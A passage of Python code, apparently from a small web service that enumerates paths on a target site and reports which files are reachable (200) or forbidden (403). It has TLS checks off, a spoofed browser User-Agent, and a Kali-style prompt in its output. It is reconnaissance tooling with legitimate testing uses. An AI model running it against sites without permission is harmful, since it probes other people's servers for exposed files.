        t_url = f"{target_url.rstrip('/')}{path}"
        try:
            res = requests.get(t_url, timeout=3, verify=False, headers={"User-Agent": "Mozilla/5.0"})
            if res.status_code == 200:
                report += f"  🚨 [200 OK] {t_url}\n"
                accessible_files.append(t_url)
            elif res.status_code == 403:
                report += f"  [403 Forbidden] {t_url}\n"
        except: pass

    report += "\n" + "=" * 55 + "\nroot@kali:~# Recon scan completed."

    record = {
        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "target": target_url,
        "waf": waf,
        "grade": grade,
        "files": accessible_files,
        "full_report": report
    }
    return report, record

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
